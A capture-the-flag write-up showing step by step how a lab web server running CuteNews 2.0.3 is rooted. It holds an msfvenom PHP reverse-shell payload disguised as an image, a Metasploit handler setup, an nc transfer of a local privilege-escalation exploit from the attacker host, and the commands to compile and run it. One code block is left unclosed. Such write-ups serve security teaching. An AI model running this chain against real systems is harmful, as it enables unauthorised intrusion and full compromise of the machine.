# Cute Problems
200

You have access to the Acme Corp Jira board, and noticed there is a ticket to fix a vulnerability with the web app at 192.168.x.7.

Why not offer them a free pentest? Show off your skills by getting root on the machine and capturing the flag. Maybe a job offer will follow?

Notes to players, adjust the 3rd octet to reflect your team's address space.

Taking a look - it's a login page. There is a link to register as a new user. Also - it's powered by something called CuteNews 2.0.3. What is this? It's an old version that is vulnerable. [https://www.exploit-db.com/exploits/37474](https://www.exploit-db.com/exploits/37474)

The exploit relies on file upload. To take advantage, we need to be a user. Let see if we can register? Why yes, we can. Let's create a reverse shell using msfvenom
```
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.5.101 LPORT=9898 -f raw > shell.jpg
```

Then, using burpsuite proxy to intercept the file upload. Rename the .jpg to .php and forward.

Next - in metasploit, set up the shell handler
```
$ msfconsole 
...
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.5.101
msf6 exploit(multi/handler) > set lport 9898
msf6 exploit(multi/handler) > exploit
```

Now, go to the /uploads site and click on the link to the reverse shell. Hopefully back in metasploit we have a shell.
```
meterpreter > ls

Spent some time digging into the files on the website. It uses a flat-file system (instead of a database). There is one user with some sudo privs - so I thought that if I could find this users password, I could run some code to get root. While there are some password hashes in the /cdata/users directory - none for the user of interest.

So, started looking that the linux box itself.
```
uname -a
Linux WebServer1.acmecorp.local 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
```

Oh - wow - that's a bit out of date

This could be an approach - [https://or10nlabs.tech/vulnhub-simple/](https://or10nlabs.tech/vulnhub-simple/)

So on my host
```
$ searchsploit linux | grep Ubuntu | grep 14.04
Apport (Ubuntu 14.04/14.10/15.0 | linux/local/37088.c
Apport 2.14.1 (Ubuntu 14.04.2)  | linux/local/36782.sh
Linux Kernel (Ubuntu 14.04.3) - | linux/local/39771.txt
Linux Kernel 3.x (Ubuntu 14.04  | linux/local/41999.txt
NetKit FTP Client (Ubuntu 14.04 | linux/dos/37777.txt
Ubuntu 14.04/15.10 - User Names | linux/local/41762.txt
WebKitGTK 2.1.2 (Ubuntu 14.04)  | linux/local/44204.md
```

And taking the first entry
```
$ cp /usr/share/exploitdb/exploits/linux/local/37088.c 37088.c
```
Now start a nc session to transfer the file,
```
nc -nlvp 31337 < 37088.c
```

and on the target, grab the file:
```
nc 192.168.5.101 31337 > /tmp/37088.c
```

give it a sec to transfer and then close the host;

Back on the target, lets compile and run the code:
```
cd tmp
gcc 37088.c -o 37088
./37088
```

and Profit! we have root.
```
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -la /root
total 24
